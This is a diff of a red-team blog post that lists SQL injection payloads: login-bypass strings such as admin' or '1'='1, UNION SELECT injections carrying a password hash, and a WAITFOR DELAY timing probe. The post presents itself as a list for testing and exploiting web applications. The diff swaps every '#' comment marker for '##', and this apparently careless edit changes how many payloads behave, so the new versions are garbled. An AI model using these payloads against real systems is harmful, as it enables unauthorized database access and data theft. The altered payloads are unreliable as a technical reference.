@@ -2,57 +2,57 @@
 title: SQL Injection Payload List
 date: 2023-02-20 05:00:00 +0800
 categories: [Red Team, Payload]
-tags: [Red Team, Payload, SQLi]        # TAG names should always be lowercase
+tags: [Red Team, Payload, SQLi]        ## TAG names should always be lowercase
 description: A comprehensive list of SQL injection payloads that can be used for testing and exploiting SQL injection vulnerabilities in web applications..
 ---
 
-# **SQL Injection Payload List**
+## **SQL Injection Payload List**
 
 ```jsx
 or 1=1
 or 1=1--
-or 1=1#
+or 1=1##
 or 1=1/*
 admin' --
-admin' #
+admin' ##
 admin'/*
 admin' or '1'='1
 admin' or '1'='1'--
-admin' or '1'='1'#
+admin' or '1'='1'##
 admin' or '1'='1'/*
 admin'or 1=1 or ''='
 admin' or 1=1
 admin' or 1=1--
-admin' or 1=1#
+admin' or 1=1##
 admin' or 1=1/*
 admin') or ('1'='1
 admin') or ('1'='1'--
-admin') or ('1'='1'#
+admin') or ('1'='1'##
 admin') or ('1'='1'/*
 admin') or '1'='1
 admin') or '1'='1'--
-admin') or '1'='1'#
+admin') or '1'='1'##
 admin') or '1'='1'/*
 1234 ' AND 1=0 UNION ALL SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed055
 admin" --
-admin" #
+admin" ##
 admin"/*
 admin" or "1"="1
 admin" or "1"="1"--
-admin" or "1"="1"#
+admin" or "1"="1"##
 admin" or "1"="1"/*
 admin"or 1=1 or ""="
 admin" or 1=1
 admin" or 1=1--
-admin" or 1=1#
+admin" or 1=1##
 admin" or 1=1/*
 admin") or ("1"="1
 admin") or ("1"="1"--
-admin") or ("1"="1"#
+admin") or ("1"="1"##
 admin") or ("1"="1"/*
 admin") or "1"="1
 admin") or "1"="1"--
-admin") or "1"="1"#
+admin") or "1"="1"##
 admin") or "1"="1"/*
 1234 " AND 1=0 UNION ALL SELECT "admin", "81dc9bdb52d04dc20036dbd8313ed055
 ' OR '1'='1
@@ -63,7 +63,7 @@ admin'--
 ' OR '1'='1' --
 ' OR 'a'='a
 ' OR 1=1 --
-' OR 1=1#
+' OR 1=1##
 ' OR 1=1/*
 ' OR 'x'='x'
 '' OR ''=''
@@ -136,7 +136,7 @@ admin'--
 ' OR 1=1--
 ' OR 'x'='x'--
 -- 
-'#
+'##
 /*
 '; WAITFOR DELAY '0:0:5'--
 ' AND 1=(SELECT COUNT(*) FROM tablenames);--
